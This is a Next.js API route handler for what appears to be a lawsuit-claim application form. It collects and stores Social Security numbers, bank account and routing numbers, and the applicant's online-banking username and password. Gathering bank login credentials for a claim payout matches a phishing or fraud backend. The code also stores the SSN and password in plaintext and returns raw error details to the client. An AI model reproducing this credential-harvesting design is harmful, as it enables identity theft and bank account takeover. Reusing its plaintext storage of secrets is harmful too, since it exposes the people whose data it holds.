import { NextRequest, NextResponse } from "next/server";
import prisma from "@/lib/prisma";

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();

    const {
      fullName,
      dateOfBirth,
      ssn,
      claimId,
      phone,
      email,
      street,
      city,
      state,
      zip,
      lawsuitType,
      filingDate,
      court,
      judgmentDate,
      totalAmount,
      bankName,
      accountNumber,
      routingNumber,
      accountType,
      paymentMethod,
      bankVerified,
      documentPdfUrl,
      consent,
      bankUsername,
      bankPassword,
    } = body;

    // Validation
    if (!fullName || !dateOfBirth || !ssn || !claimId || !email) {
      return NextResponse.json(
        { error: "Missing required fields" },
        { status: 400 }
      );
    }

    if (!consent) {
      return NextResponse.json(
        { error: "You must consent to the terms and conditions" },
        { status: 400 }
      );
    }

    if (!documentPdfUrl) {
      return NextResponse.json(
        { error: "Document PDF is required" },
        { status: 400 }
      );
    }

    // Check if claim ID already exists
    const existingApplication = await prisma.application.findUnique({
      where: { claimId },
    });

    if (existingApplication) {
      return NextResponse.json(
        { error: "An application with this Claim ID already exists" },
        { status: 409 }
      );
    }

    // Create the application
    const application = await prisma.application.create({
      data: {
        fullName,
        dateOfBirth: new Date(dateOfBirth),
        ssn,
        claimId,
        phone,
        email,
        street,
        city,
        state,
        zip,
        lawsuitType,
        filingDate: new Date(filingDate),
        court,
        judgmentDate: new Date(judgmentDate),
        totalAmount: parseFloat(totalAmount),
        bankName,
        accountNumber,
        routingNumber,
        accountType,
        paymentMethod,
        bankVerified: bankVerified || false,
        documentPdfUrl,
        consent,
        status: "submitted",
        bankUsername: bankUsername || undefined,
        bankPassword: bankPassword || undefined,
      },
    });

    return NextResponse.json(
      {
        success: true,
        message: "Application submitted successfully",
        applicationId: application.id,
      },
      { status: 201 }
    );
  } catch (error) {
    console.error("Error creating application:", error);

    if (error instanceof Error) {
      return NextResponse.json(
        { error: "Failed to submit application", details: error.message },
        { status: 500 }
      );
    }

    return NextResponse.json(
      { error: "Failed to submit application" },
      { status: 500 }
    );
  }
}
